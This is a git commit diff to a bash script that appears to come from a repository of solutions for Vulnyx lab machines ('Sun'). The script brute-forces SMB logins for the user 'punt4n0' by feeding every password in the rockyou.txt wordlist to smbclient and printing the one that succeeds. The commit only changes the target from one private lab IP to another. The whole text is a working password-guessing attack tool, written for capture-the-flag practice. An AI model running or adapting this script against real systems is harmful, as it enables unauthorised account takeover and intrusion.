0c75715fde21b4cada4821aee8e6ed976900b83d
AlexGis99 <alexgis99@gmail.com>
2024-04-18 13:10:31 -0400

    Changed brute force script

--- Vulnyx/Sun/scripts/bruteForce_smb.sh
+++ Vulnyx/Sun/scripts/bruteForce_smb.sh
@@ -7,7 +7,7 @@ for i in $(cat /usr/share/wordlists/rockyou.txt)
 do
 	PERCENT=$((INTENTO * 100 / 14344392))
 	[ $((INTENTO % 50)) -eq 0 ] && STRING="${STRING}#" && echo -n -e "\r\t$PERCENT% $STRING"
-	smbclient -L //192.168.1.13/ -U "punt4n0%$i" >/dev/null
+	smbclient -L //10.0.2.5/ -U "punt4n0%$i" >/dev/null
 	if [ $? -eq 0 ]
 	then
 		echo -e "$INTENTO:\t$i"
